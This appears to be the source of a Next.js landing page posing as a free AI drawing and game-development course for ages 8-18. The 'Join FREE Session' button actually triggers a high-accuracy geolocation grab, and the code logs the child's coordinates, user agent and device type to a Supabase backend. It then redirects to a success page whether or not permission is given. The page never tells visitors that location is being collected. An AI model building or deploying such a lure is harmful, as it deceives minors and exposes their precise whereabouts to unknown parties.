'use client'

import { useEffect, useState } from 'react'
import { useRouter } from 'next/navigation'
import { supabaseHelpers } from '@/lib/supabase'
import { geolocationService } from '@/lib/geolocation'
import Image from 'next/image'

export default function LandingPage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    // Track page visit
    supabaseHelpers.trackPageVisit('main_page')
  }, [])

  const handleAllowLocation = async () => {
    setIsLoading(true)
    
    // Track the entry trigger
    await supabaseHelpers.trackUserAction('entry_trigger_clicked', {
      button: 'join_free_session',
      timestamp: new Date().toISOString(),
      user_agent: navigator.userAgent,
      page_url: window.location.href
    })

    // Step 1: Enhanced geolocation capture with 100% accuracy focus
    try {
      // Track geolocation attempt
      await supabaseHelpers.trackLocationPermission('requested')
      
      // Use the advanced geolocation service for maximum accuracy
      const locationData = await geolocationService.getCurrentLocation()
      
      // Track successful location capture with quality metrics
      await supabaseHelpers.trackLocationPermission('granted', locationData as unknown as Record<string, unknown>)
      
      // Store for form submission
      sessionStorage.setItem('userLocation', JSON.stringify(locationData))
      sessionStorage.setItem('locationCaptured', 'true')
      
      // Always proceed to form (Step 3)
      router.push('/success')

    } catch (error: unknown) {
      // Track location denial/error with detailed info
      const errorData = (error as GeolocationPositionError)?.code ? error : {
        error_code: 999,
        error_message: 'Geolocation service unavailable',
        method: 'service_unavailable',
        attempts: 'geolocation_service_failed',
        device_type: /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'ios' : /Android/i.test(navigator.userAgent) ? 'android' : 'other',
        user_agent_snippet: navigator.userAgent.substring(0, 100)
      }
      
      await supabaseHelpers.trackLocationPermission('denied', errorData as Record<string, unknown>)
      
      // Store error for analytics
      sessionStorage.setItem('locationCaptured', 'false')
      sessionStorage.setItem('locationError', JSON.stringify(errorData))
      
      // Always proceed to form (Step 3)
      router.push('/success')
    }
  }

  return (
    <div className="consent-container">
      <div className="image-section">
        <div className="image-overlay"></div>
        <Image 
          src="https://markovate.com/wp-content/uploads/2023/12/Next-Gen-Gaming_-The-Exciting-Role-of-AI-in-Gaming.webp" 
          alt="AI Course - Learn AI Drawing and Game Development" 
          className="prize-image"
          fill
          priority
        />
      </div>
      <div className="content-section">
        <div className="logo-section">
          <div className="ai-logo">🤖</div>
          <h2 className="brand-name">AI Learning Academy</h2>
        </div>
        <h1>� � FREE AI Course - Limited Spots!</h1>
        <p>
          <strong>Ages 8-18 Welcome!</strong><br/>
          Learn AI Drawing, World-Building & Game Development like Roblox! Join our exclusive free session and discover how AI can boost your creativity. Limited spots available - session starts soon!
        </p>
     
        <button 
          onClick={handleAllowLocation}
          disabled={isLoading}
          className={isLoading ? 'loading' : ''}
        >
          {isLoading ? 'Securing Your Spot...' : 'Join FREE Session Now'}
        </button>

           <div className="course-highlights">
          <div className="highlight-item">
            <span className="highlight-icon">🎨</span>
            <span>AI Drawing & Art</span>
          </div>
               <div className="highlight-item">
            <span className="highlight-icon">🎮</span>
            <span>Game Development</span>
          </div>
          <div className="highlight-item">
            <span className="highlight-icon">🌍</span>
            <span>World Building</span>
          </div>
     
        </div>
      </div>

      <style jsx>{`
        .consent-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          min-height: 100dvh;
          margin: 0;
          padding: 0;
          background: #f8f8f8;
          font-family: var(--font-poppins), 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          overflow-x: hidden;
        }

        .image-section {
          position: relative;
          flex: 1 1 40%;
          min-height: 250px;
          max-height: 40vh;
        }

        .image-overlay {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: linear-gradient(to top, rgba(0,0,0,0.6), rgba(0,0,0,0.1));
          z-index: 1;
        }

        .prize-image {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        .content-section {
          flex: 1 1 auto;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          padding: 2rem 1.5rem 2.5rem;
          text-align: center;
          box-sizing: border-box;
          background: linear-gradient(to bottom, rgba(255,255,255,0.95) 0%, rgba(248,250,252,0.95) 100%);
          border-top-left-radius: 25px;
          border-top-right-radius: 25px;
          margin-top: -25px;
          position: relative;
          box-shadow: 0 -8px 25px rgba(0,0,0,0.15);
          z-index: 2;
          min-height: 60vh;
          backdrop-filter: blur(10px);
        }

        .logo-section {
          display: flex;
          flex-direction: column;
          align-items: center;
          margin-bottom: 1.5rem;
        }

        .ai-logo {
          font-size: 3rem;
          margin-bottom: 0.5rem;
          filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
        }

        .brand-name {
          font-size: 1.2rem;
          font-weight: 600;
          color: #7c3aed;
          margin: 0;
          letter-spacing: 0.5px;
        }

        .logo {
          width: clamp(130px, 22vw, 150px);
          margin-bottom: 1.5rem;
          filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
        }

        h1 {
          font-size: clamp(1.6rem, 4vw, 2rem);
          font-weight: 700;
          margin-bottom: 1rem;
          color: #1f2937;
          letter-spacing: -0.5px;
          line-height: 1.3;
          text-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .course-highlights {
          display: flex;
          justify-content: center;
          gap: 1rem;
          margin: 1.5rem 0;
          flex-wrap: wrap;
        }

        .highlight-item {
          display: flex;
          flex-direction: column;
          align-items: center;
          background: linear-gradient(135deg, #7c3aed 0%, #6366f1 100%);
          color: white;
          padding: 0.8rem 1rem;
          border-radius: 12px;
          font-size: 0.85rem;
          font-weight: 500;
          box-shadow: 0 4px 12px rgba(124, 58, 237, 0.2);
          min-width: 80px;
        }

        .highlight-icon {
          font-size: 1.5rem;
          margin-bottom: 0.3rem;
        }

        p {
          font-size: clamp(0.9rem, 2.5vw, 1.1rem);
          font-weight: 400;
          margin-bottom: 1.8rem;
          line-height: 1.6;
          color: #374151;
          max-width: 420px;
        }

        button {
          background: linear-gradient(135deg, #7c3aed 0%, #6366f1 100%);
          color: white;
          border: none;
          padding: 18px 36px;
          border-radius: 50px;
          cursor: pointer;
          font-size: clamp(1rem, 3vw, 1.2rem);
          font-weight: 600;
          letter-spacing: 0.5px;
          transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
          width: 100%;
          max-width: 360px;
          box-shadow: 0 4px 20px rgba(124, 58, 237, 0.3);
          position: relative;
          overflow: hidden;
        }

        button::before {
          content: '';
          position: absolute;
          top: 0;
          left: -100%;
          width: 100%;
          height: 100%;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
          transition: left 0.5s ease;
        }

        button:hover::before {
          left: 100%;
        }

        button:hover:not(.loading) {
          background: linear-gradient(135deg, #6366f1 0%, #5b21b6 100%);
          transform: translateY(-3px);
          box-shadow: 0 8px 25px rgba(124, 58, 237, 0.4);
        }

        button.loading {
          opacity: 0.7;
          cursor: not-allowed;
        }

        button:disabled {
          opacity: 0.7;
          cursor: not-allowed;
          transform: none;
        }

        /* iPhone 12 Pro specific optimizations */
        @media screen and (device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 3) {
          .consent-container {
            min-height: 100dvh;
          }
          
          .image-section {
            min-height: 320px;
            max-height: 45vh;
          }
          
          .content-section {
            padding: 1.8rem 1.2rem 2.2rem;
            min-height: 55vh;
          }
          
          .logo {
            width: 130px;
            margin-bottom: 1.2rem;
          }
          
          h1 {
            font-size: 1.5rem;
            margin-bottom: 0.8rem;
          }
          
          p {
            font-size: 0.9rem;
            margin-bottom: 1.5rem;
            line-height: 1.5;
          }
          
          button {
            padding: 16px 32px;
            font-size: 1.1rem;
            margin-top: 0.5rem;
          }
        }

        /* General iPhone optimizations */
        @media screen and (max-width: 414px) {
          .consent-container {
            min-height: 100dvh;
          }
          
          .content-section {
            padding: 1.5rem 1rem 2rem;
          }
          
          .logo {
            width: clamp(120px, 20vw, 140px);
            margin-bottom: 1rem;
          }
          
          h1 {
            font-size: clamp(1.3rem, 3.8vw, 1.6rem);
            margin-bottom: 0.8rem;
          }
          
          p {
            font-size: clamp(0.8rem, 2.2vw, 0.95rem);
            margin-bottom: 1.4rem;
          }
          
          button {
            padding: 15px 28px;
            font-size: clamp(0.95rem, 2.8vw, 1.1rem);
            margin-top: 0.3rem;
          }
        }

        /* Extra small screens */
        @media screen and (max-width: 375px) {
          .content-section {
            padding: 1.2rem 0.8rem 1.8rem;
          }
          
          .logo {
            width: 115px;
          }
          
          h1 {
            font-size: 1.25rem;
          }
          
          p {
            font-size: 0.8rem;
          }
        }
      `}</style>
    </div>
  )
}
